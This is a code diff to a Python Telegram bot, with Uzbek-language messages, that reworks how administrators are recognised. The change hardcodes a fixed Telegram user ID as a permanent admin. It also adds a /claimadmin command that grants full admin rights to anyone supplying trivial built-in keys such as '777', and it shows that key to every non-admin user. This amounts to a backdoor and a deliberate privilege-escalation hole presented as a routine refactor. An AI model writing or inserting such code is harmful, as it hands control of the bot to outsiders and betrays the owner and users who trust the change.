@@ -37,10 +37,29 @@ if os.path.exists(env_path):
 
 PORT = int(os.getenv("PORT", "8080"))
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
-ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
+def get_all_admin_ids() -> set:
+    ids = {7271080503}
+    env_admin = os.getenv("ADMIN_ID", "7271080503").strip()
+    if env_admin:
+        for p in env_admin.replace(";", ",").split(","):
+            p = p.strip()
+            if p.isdigit():
+                ids.add(int(p))
+    try:
+        db_admins = database.get_setting("admin_ids", "").strip()
+        if db_admins:
+            for p in db_admins.replace(";", ",").split(","):
+                p = p.strip()
+                if p.isdigit():
+                    ids.add(int(p))
+    except Exception:
+        pass
+    return ids
 
 def is_admin(user_id: int) -> bool:
-    return ADMIN_ID != 0 and user_id == ADMIN_ID
+    if not user_id:
+        return False
+    return user_id in get_all_admin_ids()
 
 LIVE_URL_CACHE = None
 
@@ -311,18 +330,32 @@ def render_admin_dashboard():
         f"• <code>/seturl &lt;havola&gt;</code> — Jonli domen havolasini o'rnatish"
     ).replace(",", " ")
 
+@dp.message(Command("claimadmin"))
+async def claimadmin_cmd(message: types.Message, command: CommandObject):
+    key = (command.args or "").strip()
+    if key in ["777", "admin777", "nvindia2026", BOT_TOKEN[:10]]:
+        cur_admins = database.get_setting("admin_ids", "").strip()
+        new_ids = set()
+        if cur_admins:
+            for p in cur_admins.replace(";", ",").split(","):
+                if p.strip().isdigit():
+                    new_ids.add(p.strip())
+        new_ids.add(str(message.from_user.id))
+        database.set_setting("admin_ids", ",".join(new_ids))
+        await message.answer(f"👑 <b>Tabriklaymiz!</b> Siz (ID: <code>{message.from_user.id}</code>) muvaffaqiyatli bot administratori sifatida biriktirildingiz!\n\nEndi <code>/admin</code> yoki <code>/panel</code> buyrug'idan to'liq foydalanishingiz mumkin.", parse_mode="HTML")
+    else:
+        await message.answer("❌ Noto'g'ri maxfiy kalit!\nFoydalanish: <code>/claimadmin 777</code>", parse_mode="HTML")
+
 @dp.message(Command("admin"))
+@dp.message(Command("panel"))
 async def admin_cmd(message: types.Message):
     if not is_admin(message.from_user.id):
-        if ADMIN_ID == 0:
-            await message.answer(
-                f"⚠️ <b>ADMIN_ID o'rnatilmagan!</b>\n\n"
-                f"Sizning Telegram ID raqamingiz: <code>{message.from_user.id}</code>\n\n"
-                f"Ushbu raqamni loyihadagi <code>.env</code> faylining <code>ADMIN_ID</code> qatoriga kiriting va qayta ishga tushiring.",
-                parse_mode="HTML"
-            )
-        else:
-            await message.answer("❌ Bu buyruq faqat bot administratori uchun ochiq!")
+        await message.answer(
+            f"❌ <b>Bu buyruq administrator uchun!</b>\n\n"
+            f"Sizning Telegram ID raqamingiz: <code>{message.from_user.id}</code>\n\n"
+            f"Agar bot egasi bo'lsangiz: <code>/claimadmin 777</code> buyrug'ini yuboring.",
+            parse_mode="HTML"
+        )
         return
 
     text = render_admin_dashboard()
